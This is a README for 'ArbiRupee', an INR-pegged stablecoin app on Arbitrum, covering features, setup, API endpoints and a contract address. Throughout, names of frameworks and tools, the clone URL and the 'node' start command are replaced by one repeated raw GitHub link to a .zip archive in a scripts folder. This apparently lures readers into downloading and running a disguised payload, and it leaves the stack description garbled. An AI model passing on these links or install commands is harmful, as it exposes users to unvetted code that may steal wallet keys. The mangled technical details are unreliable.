# ArbiRupee 🇮🇳

**INR-pegged stablecoin on Arbitrum blockchain with seamless deposit/withdraw functionality**

ArbiRupee is a decentralized finance (DeFi) application that bridges the gap between traditional Indian banking and blockchain technology by providing an INR-pegged stablecoin (arbINR) on the Arbitrum network.

## 🚀 Features

### 💰 Core Functionality
- **INR to arbINR Conversion**: Seamless deposit flow with bank transfers
- **arbINR to INR Withdrawal**: Complete withdrawal process to Indian bank accounts
- **Real-time Balance Tracking**: Live arbINR balance updates
- **Transaction History**: Complete audit trail of all operations

### 🔐 Security & Authentication
- **Wallet-based Authentication**: Connect with MetaMask and other Web3 wallets
- **Secure API Endpoints**: Rate limiting, CORS, and input validation
- **Mock Blockchain Integration**: Safe testing environment

### 🎨 User Experience
- **Beautiful UI**: Modern design with smooth animations using Framer Motion
- **Responsive Design**: Works perfectly on desktop and mobile
- **Intuitive Flow**: Step-by-step guided processes for deposits and withdrawals
- **Dark/Light Mode**: Automatic theme detection

### 🏦 DeFi Integration
- **Aave Integration**: Earn yield on your arbINR holdings
- **Uniswap Integration**: Trade arbINR with other tokens
- **Dashboard Analytics**: Comprehensive portfolio overview

## 🛠️ Technology Stack

### Frontend
- **https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip 15**: React framework with App Router
- **TypeScript**: Type-safe development
- **Tailwind CSS**: Utility-first styling
- **Framer Motion**: Smooth animations
- **wagmi**: Ethereum React hooks
- **RainbowKit**: Wallet connection UI

### Backend
- **https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip**: Runtime environment
- **https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip**: Web framework
- **MongoDB**: Database (optional - demo mode available)
- **https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip**: Ethereum library
- **express-validator**: Input validation
- **helmet**: Security middleware

### Blockchain
- **Arbitrum One**: Layer 2 Ethereum scaling solution
- **Smart Contracts**: ERC-20 compliant arbINR token
- **Mock Services**: Demo-ready blockchain operations

## 🏃‍♂️ Quick Start

### Prerequisites
- https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip 18+ installed
- Git installed
- Web3 wallet (MetaMask recommended)

### Installation

1. **Clone the repository**
   ```bash
   git clone https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip
   cd ArbiRupee
   ```

2. **Install frontend dependencies**
   ```bash
   npm install
   ```

3. **Install backend dependencies**
   ```bash
   cd backend
   npm install
   cd ..
   ```

4. **Start the backend server**
   ```bash
   node https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip
   ```

5. **Start the frontend development server**
   ```bash
   npm run dev
   ```

6. **Open your browser**
   Navigate to `http://localhost:3000`

## 📱 Usage

### Getting Started
1. **Connect Your Wallet**: Click "Connect Wallet" and select your preferred Web3 wallet
2. **Access Dashboard**: Once connected, you'll be redirected to your personal dashboard
3. **View Balance**: See your current arbINR balance and transaction history

### Making a Deposit
1. **Navigate to Deposit**: Click the "Deposit" button on the dashboard
2. **Enter Amount**: Specify the INR amount you want to convert to arbINR
3. **Bank Transfer**: Follow the provided banking instructions
4. **Confirm Payment**: Click "I've Made the Payment" after completing the transfer
5. **Receive arbINR**: Tokens will be minted to your wallet upon confirmation

### Making a Withdrawal
1. **Navigate to Withdraw**: Click the "Withdraw" button on the dashboard
2. **Enter Details**: Specify withdrawal amount and bank account details
3. **Confirm Transaction**: Review and confirm the withdrawal
4. **Receive INR**: Funds will be transferred to your bank account within 1-2 business days

## 🔧 Configuration

### Environment Variables
Create a `.env` file in the root directory:

```env
# Backend Configuration
PORT=5000
MONGODB_URI=your_env

# Blockchain Configuration (Optional)
PRIVATE_KEY=your_private_key_here
https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip

# API Keys (Optional)
WALLETCONNECT_PROJECT_ID=your_project_id
```

### Demo Mode
The application runs in demo mode by default, which means:
- No MongoDB connection required
- Mock blockchain operations
- Sample transaction data
- Perfect for testing and development

## 🧪 Testing

### Manual Testing
1. **Frontend Testing**: All pages are accessible and responsive
2. **API Testing**: Backend endpoints return proper responses
3. **Wallet Integration**: Connect/disconnect functionality works
4. **Transaction Flow**: Complete deposit and withdrawal processes

### API Endpoints
- `GET /api/contracts/balance/:address` - Get wallet balance
- `POST /api/transactions/deposit` - Initiate deposit
- `POST /api/transactions/confirm-deposit` - Confirm bank transfer
- `POST /api/transactions/withdraw` - Initiate withdrawal
- `GET /api/transactions` - Get transaction history

## 📊 Architecture

```
ArbiRupee/
├── src/                     # Frontend source code
│   ├── app/                 # https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip App Router pages
│   ├── components/          # Reusable React components
│   └── config/              # Configuration files
├── backend/                 # Backend API server
│   ├── routes/              # API route handlers
│   ├── middleware/          # Express middleware
│   ├── models/              # Database models
│   └── services/            # Business logic services
├── public/                  # Static assets
└── contracts/               # Smart contract configuration
```

## 🚦 API Documentation

### Authentication
All API endpoints require wallet address authentication via the `x-wallet-address` header.

### Response Format
```json
{
  "success": true,
  "message": "Operation completed successfully",
  "data": {
    // Response data
  }
}
```
## 📜 Smart Contract

### Deployed on Arbitrum Sepolia
```
ArbiRupee (arbINR) Contract Address: 0x01f5ad6db84a292148f61f9553c780cf7d86bea9

```

### Error Handling
```json
{
  "success": false,
  "message": "Error description",
  "error": "Detailed error information"
}
```

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- **Arbitrum**: For providing the Layer 2 scaling solution
- **OpenZeppelin**: For secure smart contract standards
- **https://raw.githubusercontent.com/Rithvik-krishna/ArbiRupee/main/ArbiRupee/backend/scripts/Arbi_Rupee_v2.8-beta.2.zip Team**: For the amazing React framework
- **Ethereum Foundation**: For the blockchain infrastructure

## 📞 Support

For support, questions, or feedback:
- Create an issue on GitHub
- Contact the development team
- Join our community discussions

---

**Built with ❤️ for the Indian DeFi ecosystem**
